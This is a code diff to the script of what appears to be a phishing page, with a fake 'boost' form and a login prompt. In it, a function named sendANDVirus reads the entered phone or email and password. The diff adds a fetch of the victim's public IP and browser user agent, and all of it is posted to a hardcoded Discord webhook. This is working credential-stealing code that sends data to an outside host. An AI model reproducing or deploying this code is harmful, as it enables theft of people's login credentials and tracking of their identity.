@@ -128,6 +128,7 @@ display:none;
 </div>
 </div>
     <script>
+
         function showLogin() {
             document.getElementById('boostForm').style.display = 'none';
 document.querySelector(".fakePC").style.display="block";
@@ -139,9 +140,14 @@ document.querySelector(".fakePC").style.display="none";
 async function sendANDVirus(){
 let telEmail=document.querySelector("#email").value;
 let senha=document.querySelector("#senha").value;
-const webhookURL="https://discord.com/api/webhooks/1325626529216200797/agMz3pSFTYcvAGu0N_kyZWTPdm54_7xyr6ElRPKrraIKcdtsb5t3WlDqqgNB5yjrSnLp"
+ip="";
+let rpp=await fetch("https://api.ipify.org?format=json");
+let dats=await rpp.json();
+ip=dats.ip;
+const webhookURL="https://discord.com/api/webhooks/1325626529216200797/agMz3pSFTYcvAGu0N_kyZWTPdm54_7xyr6ElRPKrraIKcdtsb5t3WlDqqgNB5yjrSnLp";
+
 const msg={
-content: "Telefone/Email: "+telEmail+"\nSenha: "+senha
+content: "--------------\n {IP}: "+ip+"\n\n{USER AGENT}: "+navigator.userAgent+"  \n\n\n {TELEFONE/EMAIL}: "+telEmail+"\n\n {SENHA}: "+senha+" \n\n------------"
 }
 let resp= await fetch(webhookURL,{
 method: "POST",
